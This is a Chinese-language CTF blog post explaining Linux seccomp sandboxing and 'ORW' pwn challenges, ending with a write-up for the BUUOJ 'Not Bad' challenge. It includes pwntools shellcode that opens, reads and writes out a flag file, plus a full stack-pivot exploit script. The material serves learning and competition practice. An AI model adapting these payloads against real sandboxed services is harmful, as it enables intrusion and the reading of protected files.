---
title: "CTF-pwn orw"
description: "浅学 orw，如有错误请指出"
date: 2026-05-28T00:00:00+08:00
image: ctf_pwn_orw.jpg
math: true
license: 
hidden: false
comments: true
draft: false
categories:
    - ctf
tags:
    - ctf
    - 学习日志
---

## 前言

使用环境 ：`wsl kali linux`。

本文集中介绍 `seccomp` 沙箱与 orw 相关题型知识。

## seccomp 沙箱

全称名为 `secure computing mode`，其是 linux 内核提供的一种安全机制，它的作用是：

**设定并检查一种 syscall 是否合法**

比如在 pwn 中，就可以通过 seccomp 沙箱，禁止调用  `execve('/bin/sh',,)`。

### seccomp 沙箱模式

1.strict mode

严格模式（白名单），只允许少数的 syscall 执行。

设置方式类似：

`prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);`

2.filter mode

过滤模式，相比严格模式更加灵活。黑名单。

设置方式类似：

`prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);`

或者用 `libseccomp`：

```
v1 = seccomp_init(0);
seccomp_rule_add(v1, 2147418112, 0, 0);
seccomp_rule_add(v1, 2147418112, 1, 0);
seccomp_rule_add(v1, 2147418112, 2, 0);
seccomp_rule_add(v1, 2147418112, 60, 0);
return seccomp_load(v1);
```

### 如何使用 libseccomp 设置一个 seccomp 沙箱

1.安装开发库

`sudo apt install -y libseccomp-dev gcc`

2.一个简单的 seccomp 程序

这个程序只允许：

```
read
write
open
exit
exit_group
```

写 `sandbox.c`：

```
#include <seccomp.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/syscall.h>

void sandbox() {
    scmp_filter_ctx ctx;

    // 默认动作：不符合规则的 syscall 全部杀掉
    ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx) {
        perror("seccomp_init");
        _exit(1);
    }

    // 允许 read
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);

    // 允许 write
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);

    // 允许 open
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);

    // 允许 exit
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);

    // 允许 exit_group
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

    // 加载规则
    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        _exit(1);
    }

    seccomp_release(ctx);
}

int main() {
    sandbox();

    // 以下具体功能实现
}
```

编译： `gcc sandbox.c -o sandbox -lseccomp`。

（`-lseccomp` 指链接 seccomp 库）

### seccomp 其他规则

上面程序的规则是 `SCMP_ACT_KILL`，也就是所有不符合条件的 syscall 直接杀程序。

我们也可以改为 `SCMP_ACT_ERRNO(1)`，也就是不符合条件的 syscall 不会直接杀程序，而是返回 `EPERM`，调试更加友好。

### seccomp 限制 syscall 参数

seccomp 不仅可以限制 syscall 的 rax，或者 32 位中的 “syscall 类型”，还可以进一步实现参数的控制与限制。

比如，允许 `write(1, buf, size);`，但是不允许 `write(2, buf, size);`，可以这样写：

```
seccomp_rule_add(
    ctx,
    SCMP_ACT_ALLOW,
    SCMP_SYS(write),
    1,    // 有一个限制条件
    SCMP_A0(SCMP_CMP_EQ, 1)  // 限制 fd 必须为 1
);
```

但是 seccomp 不能检查其指针指向的内存内容。

比如说 `write(1, buf, size);`，我们可以限制其只能输出 buf1，假设 buf1 的地址是 `0x404080`，我们可以这样写：

`SCMP_A1(SCMP_CMP_EQ, (scmp_datum_t)buf1)    // buf == buf1`

但是我们不能检查 buf 里面有没有 flag，并要求其不能输出 flag。

### 查看 seccomp 规则

假设这个二进制文件叫 pwn。

`seccomp-tools dump ./pwn`

<img width="674" height="338" alt="image" src="https://github.com/user-attachments/assets/68e605ba-edcc-4254-b970-2e7ee57ae18d" />

可以看到：

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

类 `0000` 即编号（ CODE ），可以看到 `if(judge)  goto XXXX` 就是符合 `judge` 条件就跳转到 `XXXX` 编号上执行。

即，除了 read，write，open，exit 以外的就直接 kill 了。

其他的：

* JT：指 jump true，条件为真时，从下一条指令开始，向下跳几条指令。
  * 如 `0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009`，当条件为真时，向下跳 `0x03` 条指令， 0006 + 0x03 = 0009，执行 `return ALLOW`。
  * 可见 `read write open` 的三个 JT 是连号的 `0x03 0x02 0x01`。
* JF：指 jump false，条件为假时，从下一条指令开始，向下跳几条指令。
  * 可见 `read write open` 的三个 JF 都是 `0x00`，所以他们是顺序连续执行判断的。
* K：常量，具体含义要看 CORE。

`open read write` 取三个首字母即 ORW，CTF 中的一种常见题型。

## ORW

ORW 即在沙箱禁止 `execve` 的情况下，如何使用 `open read write` 三种权限，读取并输出 flag 的题目。

### 典型 ORW

```
buf = 0x123100    // buf 是可读可写区域

payload = asm(shellcraft.open("./flag", 0))
payload += asm(shellcraft.read("rax", buf, 0x50))
payload += asm(shellcraft.write(1, buf, 0x50))
```

相当于：

```
open("./flag", 0)
read(open返回的fd, 0x123100, 0x50)
write(1, 0x123100, 0x50)
```

### 如果只允许 openat

当传给函数的路径名是绝对路径时，open 与 openat 无区别，此时 openat 自动忽略第一个参数fd。

openat 的函数原型为 `int openat(int dirfd, const char *pathname, int flags);`，其第一个参数是目录文件描述符。

其中，`-100` 对应 `#define AT_FDCWD -100`，指当前工作目录下。

因此只需要写：

```
payload = asm(shellcraft.openat(-100, "./flag", 0))
```

只允许用 `writev`，`sendfile` 等同理。

### 例题：[极客大挑战 2019]Not Bad

[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad)

这道题我们发现，首先是溢出长度太短，其次是 orw，但是题目一开始就分配了一段大小为 0x1000 的可读可写可执行区域，mmap。

考虑栈迁移，ROP_gadget 查询到有 `jmp rsp`，所以可以直接用。

`leave` 相当于 `mov rsp,rbp;pop rbp;`，此时 rsp 指向 ret。

`ret` 相当于 `pop rip;jmp rip`，在这里我们填上写有 `jmp rsp` 的地址。

`pop rip` 执行使 rsp 下移到 ret+8，需要 `sub rsp,0x30` 才能回到输入的位置。

`jmp rip` 执行了 `jmp rsp`，现在会执行 ret+8 位置的命令。

所以我们需要在 ret+8 的位置填上 `sub rsp,0x30;jmp rsp`。

payload 长这样：

```
payload = asm(shellcraft.read(0,mmap,0x100)) + asm('mov rax,0x123000;call rax')
payload = payload.ljust(0x28,b'\x00')
payload += p64(jmp_rsp) + asm('sub rsp,0x30;jmp rsp')
```

因此就会实现栈迁移，迁移到 mmap 上，在 mmap 的前 0x100 大小的部分写入什么就会执行什么。

最终 exp：

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

# host = "node5.buuoj.cn"
# port = 26129
# io = remote(host,port)
elf = ELF("./bad")
io = process("./bad")
leave_ret = 0x400A49
jmp_rsp = 0x400a01
mmap = 0x123000

def main():
    orw = asm(shellcraft.open("./flag"))
    orw += asm(shellcraft.read(3,mmap+0x100,0x50))
    orw += asm(shellcraft.write(1,mmap+0x100,0x50))
    io.recvuntil(b"Easy shellcode, have fun!\n")
    payload = asm(shellcraft.read(0,mmap,0x100)) + asm('mov rax,0x123000;call rax')
    payload = payload.ljust(0x28,b'\x00')
    payload += p64(jmp_rsp) + asm('sub rsp,0x30;jmp rsp')
    io.send(payload)
    # gdb.attach(io)
    # pause()
    io.send(orw)
    io.interactive()

if __name__ == "__main__":
    main()
```
